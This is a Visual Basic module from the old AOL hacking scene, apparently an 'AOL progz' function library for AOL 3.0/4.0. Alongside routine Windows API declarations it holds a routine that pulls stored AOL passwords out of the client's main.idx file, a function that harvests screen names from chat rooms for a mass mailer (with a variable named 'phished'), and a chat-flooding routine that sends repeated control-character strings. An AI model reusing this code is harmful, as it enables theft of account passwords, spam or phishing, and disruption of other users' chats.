Attribute VB_Name = "NKillaZv2"
'N KillaZv1.bas By: N KillaZ
'this .bas has 250 functions
'This bas is for aol3.o and 4.o
'Mail me at nkillaz@hotmail.com
'or IM me on aim..
'my aim sn is: XNKillaZX
'-N KillaZ
'Greets:
'Evil Cl0wn
'Cyrix
'Progee
'Hider
'dos
'MeeH
'NiveK
'monk-e-god
'CIA
'Mission
'and Jaguar ;D
Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function GetPrivateProfileSection Lib "kernel32" Alias "GetPrivateProfileSectionA" (ByVal lpAppName As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileSection Lib "kernel32" Alias "WritePrivateProfileSectionA" (ByVal lpAppName As String, ByVal lpString As String, ByVal lpFileName As String) As Long
Declare Function BringWindowToTop Lib "user32" (ByVal hwnd As Long) As Long
Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal fEnable As Long) As Long
Declare Function ReleaseCapture Lib "user32" () As Long
Private Declare Function WindowFromPointXY Lib "user32" Alias "WindowFromPoint" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Declare Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
Declare Function RegisterClipboardFormat Lib "user32" Alias "RegisterClipboardFormatA" (ByVal lpString As String) As Long
Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef Dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal Dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal Dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Declare Function SendMessage2 Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Declare Function mciSendString& Lib "Winmm" Alias "mciSendStringA" (ByVal lpstrCommand$, ByVal lpstrReturnStr As Any, ByVal wReturnLen&, ByVal hCallBack&)
'sndPlaySound  flag values for uFlags parameter
Public Const SND_SYNC = &H0         '  play synchronously (default)
Public Const SND_ASYNC = &H1         '  play asynchronously
Public Const SND_NODEFAULT = &H2         '  silence not default, if sound not found
Public Const SND_MEMORY = &H4         '  lpszSoundName points to a memory file
Public Const SND_ALIAS = &H10000     '  name is a WIN.INI [sounds] entry
Public Const SND_FILENAME = &H20000     '  name is a file name
Public Const SND_RESOURCE = &H40004     '  name is a resource name or atom
Public Const SND_ALIAS_ID = &H110000    '  name is a WIN.INI [sounds] entry identifier
Public Const SND_ALIAS_START = 0  '  must be > 4096 to keep strings in same section of resource file
Public Const SND_LOOP = &H8         '  loop the sound until next sndPlaySound
Public Const SND_NOSTOP = &H10        '  don't stop any currently playing sound
Public Const SND_VALID = &H1F        '  valid flags          / ;Internal /
Public Const SND_NOWAIT = &H2000      '  don't wait if the driver is busy
Public Const SND_VALIDFLAGS = &H17201F    '  Set of valid flag bits.  Anything outside
 '  this range will raise an error
Public Const SND_RESERVED = &HFF000000  '  In particular these flags are reserved
Public Const SND_TYPE_MASK = &H170007

Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3
Public Const EM_GETLINE = &HC4

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)

Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000
Public Const WM_NCMOUSEMOVE = &HA0
Public Const WM_NCLBUTTONDOWN = &HA1
Public Const WM_NCLBUTTONUP = &HA2

Public Const HTERROR = (-2)
Public Const HTTRANSPARENT = (-1)
Public Const HTNOWHERE = 0
Public Const HTCLIENT = 1
Public Const HTCAPTION = 2
Public Const HTSYSMENU = 3
Public Const HTGROWBOX = 4
Public Const HTSIZE = HTGROWBOX
Public Const HTMENU = 5
Public Const HTHSCROLL = 6
Public Const HTVSCROLL = 7
Public Const HTMINBUTTON = 8
Public Const HTMAXBUTTON = 9
Public Const HTLEFT = 10
Public Const HTRIGHT = 11
Public Const HTTOP = 12
Public Const HTTOPLEFT = 13
Public Const HTTOPRIGHT = 14
Public Const HTBOTTOM = 15
Public Const HTBOTTOMLEFT = 16
Public Const HTBOTTOMRIGHT = 17
Public Const HTBORDER = 18
Public Const HTREDUCE = HTMINBUTTON
Public Const HTZOOM = HTMAXBUTTON
Public Const HTSIZEFIRST = HTLEFT
Public Const HTSIZELAST = HTBOTTOMRIGHT

Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Type POINTAPI
   X As Long
   Y As Long
End Type
Global buff5
Global lists
Global phished
Global fin2
Global stats
Global im_message
Global Mail_Message
Global Mail_Subject
Global Memory1
Global Memory2
Global Switch
Global Memory3
Global Memory4
Global UseMemberRoom
Global title
Global TheAVG
Global IMingC
Global buff4    'Holds Random Memory
Global Buff3
Global Buff6
Global Sacks
Global NightM
Global Y
Global buff2    'Holds Random Memory
Global NameListing
Global Buff     'Holds random Memory
Global Regy
Global fin
Global ct       'Current Time
Global RoomHits 'Room Hits
Global Log      'Sending Log
Global TheList  'The Mail List
Global r&       'Result Code from WritePrivateProfileString
Global entry$   'Passed to WritePrivateProfileString
Global FRT
Global iniPath$ 'Path to .ini file
Global tName
Global tGroup

Function AIMIM(SN As String, Person As String, Message As String)
AIM% = FindWindow(vbNullString, SN & "'s Buddy List")
AIMPANEL% = FindChildByClass(AIM%, "_Oscar_Tabgroup")
AIMPANEL% = FindChildByClass(AIMPANEL%, "_Oscar_IconBtn")
AIMPANEL% = GetWindow(AIMPANEL%, GW_HWNDNEXT)
AG:
Click AIMPANEL%
pause (0.2)
IM% = FindWindow(vbNullString, "Instant Message")
If IM% = 0 Then GoTo AG
Frame% = FindChildByClass(IM%, "_Oscar_PersistantCombo")
PSlot% = FindChildByClass(Frame%, "Edit")
M2Slot% = FindChildByClass(IM%, "WndAte32Class")
MsgBox M2Slot%
MSlot% = FindChildByClass(M2Slot%, "Ate32Class")
MsgBox MSlot%
Call AOLSetText(PSlot%, Person)
Call AOLSetText(MSlot%, Message)
End Function

Function GatherNames(Many As String, Listb As ListBox, frm As Form)
Memory2 = FindChatCount2
EnterFindaChat
GatherMore:

Aroom = FindChildByTitle(AOLMDI, "Who's Chatting")
killwin (Aroom)
ST:
Memory1 = Memory1 + 1
AOLChangeCaption ("America  Online(Extracting From Room # " & Memory1 & " of " & Memory2 & ".")
FindChat2_SetCursor (Memory1)
pause (0.3)
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
AKA:
FindChatWHoButton
pause (1)
room = FindChildByTitle(AOLMDI, "Who's Chatting")
If room = 0 Then
 AOLW% = FindWindow("_AOL_Modal", vbNullString)
 If AOLW% <> 0 Then
 a = SendMessage(AOLW%, WM_CLOSE, 0, 0)
 AOLButton (FindChildByTitle(AOLW%, "OK"))
 If AOLW% = 0 Then GoTo ST
  End If
  End If
LM:
'Call AddRoomByBox(Form1.List1)
pause (1.2)
  GoTo Last
Last:
pause (0.5)
'frm.gathered.Caption = Form1.List1.ListCount
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If Memory1 = Memory2 - 1 Then
If Memory3 = 10 Then
AOLChangeCaption ("Finished Gathering Names")
TheMailer.Enabled = True
  End If
  
AOLChangeCaption ("Moving to Next Catagory")
Memory3 = Memory3 + 1
FindChat1_SetCursor (Memory3)
FindChatViewButton1
Memory1 = 0
pause (7)
Memory2 = FindChatCount2
End If
pause (0.5)
'If Form1.List1.ListCount > Many Then GoTo vLast
GoTo GatherMore
vLast:
AOLChangeCaption ("Gathered")
End Function
Function ActivateAOL()
X = GetCaption(AOLWindow)
AppActivate X
End Function
Function AolPassword(AolPath As String, MySN As String) As String
Dim l004C As Variant
Dim l0050 As Variant
Dim l0054 As Variant
Dim l0058 As String
Dim l005A As Variant
Dim l005E As Variant
Dim l0062 As Variant
Dim l0066 As Variant
l004C = Len(MySN)
Select Case l004C
Case 3
l0050 = MySN + "       "
Case 4
l0050 = MySN + "      "
Case 5
l0050 = MySN + "     "
Case 6
l0050 = MySN + "    "
Case 7
l0050 = MySN + "   "
Case 8
l0050 = MySN + "  "
Case 9
l0050 = MySN + " "
Case 10
l0050 = MySN
End Select
l0054 = 1
Do Until 2 > 3
l0058$ = ""
DoEvents
On Error Resume Next
Open AolPath$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Function
l0058$ = String(32000, 0)
Get #1, l0054, l0058$
Close #1
Open AolPath$ + "\idb\main.idx" For Binary As #2
l005A = InStr(1, l0058$, l0050 + Chr(0), 1)
If l005A Then
40:
DoEvents
Mid(l0058$, l005A) = "Pass Word "
l005E = Mid(l0058$, l005A + Len(l0050) + 1, 8)
l005E = CutStringDown(l005E)
l0062 = Mid(l0058$, l005A + Len(l0050) + 1 + Len(l005E), 1)
If l0062 <> Chr(0) Then GoTo 45
If Len(l005E) < 4 Then GoTo 45
If Len(l005E) = "" Then GoTo 45
AolPassword = l005E
45:
l005A = InStr(1, l0058$, l0050 + Chr(0), 1)
If l005A Then DoEvents: GoTo 40
End If
l0054 = l0054 + 32000
l0066 = LOF(2)
Close #2
If l0054 > l0066 Then GoTo 30
Loop
30:
End Function
Sub AOLFakeOH()
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth"
pause (0.5)
